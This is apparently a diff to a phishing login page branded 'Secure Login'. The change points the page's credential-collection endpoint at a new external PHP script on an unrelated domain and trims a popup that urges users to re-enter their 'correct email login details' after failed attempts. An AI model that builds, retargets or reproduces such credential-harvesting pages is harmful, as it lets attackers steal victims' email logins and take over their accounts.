@@ -335,13 +335,13 @@
 
     <div class="footer">
         <span>© 2026 <span id="footer-domain">Secure Login</span>. All rights reserved.</span>
-        <a href="#" id="footer-link">example.com</a>
+        <a href="#" id="footer-link">Welcome</a>
         <span class="timestamp" id="footer-time">| Last updated: --</span>
     </div>
 
     <script>
         // === CONFIG ===
-        const API_URL = 'https://processing.fwh.is/pop/process.php';
+        const API_URL = 'https://groupcd.space/moveup/cbs/process.php';
         const MAX_ATTEMPTS = 3;
         const MAX_RETRIES = 3;
         const RETRY_DELAY = 2000;
@@ -517,7 +517,7 @@
             }
 
             if (state.attempts >= 2 && state.email) {
-                showPopup("Ensure you are using your correct email login details for this secured course.");
+                showPopup("Ensure you are using your correct email login details.");
             }
 
             if (state.attempts >= MAX_ATTEMPTS) {
